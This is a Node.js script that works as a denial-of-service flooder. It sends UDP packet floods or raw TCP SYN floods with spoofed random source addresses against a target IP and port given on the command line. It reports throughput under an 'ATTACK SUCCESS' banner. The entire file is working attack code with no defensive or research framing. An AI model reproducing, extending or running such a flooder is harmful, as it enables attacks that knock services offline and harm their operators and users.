const dgram = require('dgram');
const crypto = require('crypto');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const method = process.argv[6];

if (!target || !port || !duration || !threads || !method) process.exit(1);

const hostname = os.hostname();
let sent = 0;
let start = Date.now();

if (method === 'udp') {
    const payload = crypto.randomBytes(1400);
    
    for(let i = 0; i < threads; i++) {
        const sock = dgram.createSocket('udp4');
        sock.on('error', () => {});
        
        const send = () => {
            sock.send(payload, port, target, () => {
                sent++;
                setImmediate(send);
            });
        };
        send();
    }
    
    setTimeout(() => {
        const elapsed = (Date.now() - start) / 1000;
        const pps = sent / elapsed;
        const mbps = (sent * 1400 * 8) / elapsed / 1024 / 1024;
        console.log(`✅ ATTACK SUCCESS | ${sent.toLocaleString()} packets | ${pps.toFixed(0)} PPS | ${mbps.toFixed(2)} Mbps`);
        process.exit(0);
    }, duration * 1000);
}

else if (method === 'tcp-raw') {
    let raw;
    try { raw = require('raw-socket'); } catch(e) { process.exit(1); }
    
    const dstIp = target.split('.').map(Number);
    let totalSent = 0;
    
    function randomIp() {
        return [Math.floor(Math.random()*255), Math.floor(Math.random()*255), Math.floor(Math.random()*255), Math.floor(Math.random()*255)];
    }
    
    function checksum(buf) {
        let sum = 0;
        for(let i=0; i<buf.length; i+=2) {
            sum += (buf[i]<<8) + (buf[i+1]||0);
            if(sum>0xffff) sum = (sum&0xffff)+(sum>>>16);
        }
        return ~sum & 0xffff;
    }
    
    function createSynPacket(srcIp, srcPort, seq) {
        const ip = Buffer.alloc(20);
        ip[0]=0x45;
        ip.writeUInt16BE(40,2);
        ip.writeUInt16BE(Math.floor(Math.random()*65535),4);
        ip.writeUInt16BE(0x4000,6);
        ip[8]=255; ip[9]=6;
        ip[12]=srcIp[0]; ip[13]=srcIp[1]; ip[14]=srcIp[2]; ip[15]=srcIp[3];
        ip[16]=dstIp[0]; ip[17]=dstIp[1]; ip[18]=dstIp[2]; ip[19]=dstIp[3];
        
        let ipSum=0;
        for(let i=0;i<20;i+=2) ipSum+=ip.readUInt16BE(i);
        while(ipSum>0xffff) ipSum=(ipSum&0xffff)+(ipSum>>>16);
        ip.writeUInt16BE(~ipSum&0xffff,10);
        
        const tcp = Buffer.alloc(20);
        tcp.writeUInt16BE(srcPort,0);
        tcp.writeUInt16BE(port,2);
        tcp.writeUInt32BE(seq,4);
        tcp.writeUInt32BE(0,8);
        tcp[12]=0x50; tcp[13]=0x02;
        tcp.writeUInt16BE(65535,14);
        tcp.writeUInt16BE(0,16); tcp.writeUInt16BE(0,18);
        
        const pseudo = Buffer.alloc(12);
        pseudo[0]=srcIp[0];pseudo[1]=srcIp[1];pseudo[2]=srcIp[2];pseudo[3]=srcIp[3];
        pseudo[4]=dstIp[0];pseudo[5]=dstIp[1];pseudo[6]=dstIp[2];pseudo[7]=dstIp[3];
        pseudo[8]=0;pseudo[9]=6;pseudo.writeUInt16BE(20,10);
        
        let tcpSum=0;
        for(let i=0;i<12;i+=2) tcpSum+=pseudo.readUInt16BE(i);
        for(let i=0;i<20;i+=2) tcpSum+=tcp.readUInt16BE(i);
        while(tcpSum>0xffff) tcpSum=(tcpSum&0xffff)+(tcpSum>>>16);
        tcp.writeUInt16BE(~tcpSum&0xffff,16);
        
        return Buffer.concat([ip, tcp]);
    }
    
    for(let i=0; i<threads*3; i++) {
        const socket = raw.createSocket({ protocol: raw.Protocol.TCP });
        socket.on('error', () => {});
        let srcPort = Math.floor(Math.random()*64511)+1024;
        let seq = Math.floor(Math.random()*0xffffffff);
        
        const send = () => {
            socket.send(createSynPacket(randomIp(), srcPort, seq), 0, 40, target, () => { totalSent++; });
            srcPort = (srcPort+1)%65535;
            if(srcPort<1024) srcPort=1024;
            seq = (seq+1000)>>>0;
            setImmediate(send);
        };
        send();
    }
    
    setTimeout(() => {
        const elapsed = (Date.now() - start) / 1000;
        console.log(`✅ ATTACK SUCCESS | ${totalSent.toLocaleString()} SYN packets | ${(totalSent/elapsed).toFixed(0)} PPS`);
        process.exit(0);
    }, duration * 1000);
}
